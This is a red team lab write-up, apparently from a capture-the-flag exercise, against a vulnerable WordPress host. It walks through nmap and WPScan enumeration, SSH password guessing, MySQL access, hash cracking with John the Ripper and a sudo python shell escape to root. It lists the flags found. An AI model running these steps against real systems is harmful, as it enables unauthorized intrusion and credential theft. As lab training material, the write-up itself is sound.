                                 By: Rodrigo Quiroz
# Red Team: Summary of Operations
----------------------------------
### Table of Contents

* Exposed Services
* Critical Vulnerabilities
* Exploitation


### Exposed Services

* Nmap scan results for each machine reveal the below services and OS details:
* **$ nmap -sV 192.168.1.110**
* ![alt text](https://github.com/Rodrig000/Project1Repository/blob/main/images/rl%20nmap%20scan.jpg)
_This scan identifies the services below as potential points of entry:_

#### Target 1
* **_Port 22/TCP Open SSH_**
* **_Port 80/TCP Open HTTP_**
* **_Port 111/TCP Open rcpbind_**
* **_Port 139/TCP Open netbios_**
* **_Port 445/TCP Open netbios_**

### The following vulnerabilities were identified on each target:

#### Target 1

_List of Critical Vulnerabilities_
* **_WordPress user numeration_**
* **_ssh into system and brute force into account_**
* **_Privilage escalation_**

## Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

#### Target 1


flag1.txt: **_b9bbcb33e11b80be759c4e844862482d_**


*Exploit Used*

* Exploit used: **used WPScan to enumerate the users so that it was possible to ssh into their account**
* Command: **$wpscan --url 192.168.1.110/wordpress $ wpscan --url 192.168.1.110 --enumerate -u**
![alert_text](https://github.com/Rodrig000/Project1Repository/blob/main/images/wpscan.jpg)
![alert_text](https://github.com/Rodrig000/Project1Repository/blob/main/images/users.jpg)

* we were able to target the user michael and ssh into that account by using michael as the password

_captured flag 1_

![alert_text](https://github.com/Rodrig000/Project1Repository/blob/main/images/flag1.jpg)

flag2.txt: **fc3fd58dcdad9ab23faca6e9a36e581c**

*Exploit Used*
* were able to navigate through the account directory and find flag 2 in the /var/www directory
* Commands: 
* **cd ./var/www**
* **ls -la**
* **cat flag2.txt**

_captured flag 2_

![alert_text](https://github.com/Rodrig000/Project1Repository/blob/main/images/flag2.jpg)

flag3.txt: **afc01ab56b50591e7dccf93122770cd2**

*Exploit Used*
* Entering MySQL database we were able to find flag 3
* Commands: 
* **mysql -u root -p**
* **show databases;**
* **use wordpress;**

_captured flag 3_

![alert_text](https://github.com/Rodrig000/Project1Repository/blob/main/images/flag3.jpg)

flag4.txt **715dea6c055b9fe3337544932f2941ce**

*Exploit Used*
* We were able to switch over to Stevens account by using john the ripper to crack his password using the hashes we found in the MySQL database "wp-users" location we were then able to use a sudo python command to obtain flag 4

* Commands:
* **ssh steven@192.168.1.110**
* **pink84;**
* ( _stevens password_ )
* **Sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’** 
* **ls -la**
* **cat flag4.txt**

_capturing flag 4_

![alert_text](https://github.com/Rodrig000/Project1Repository/blob/main/images/flag4.jpg)

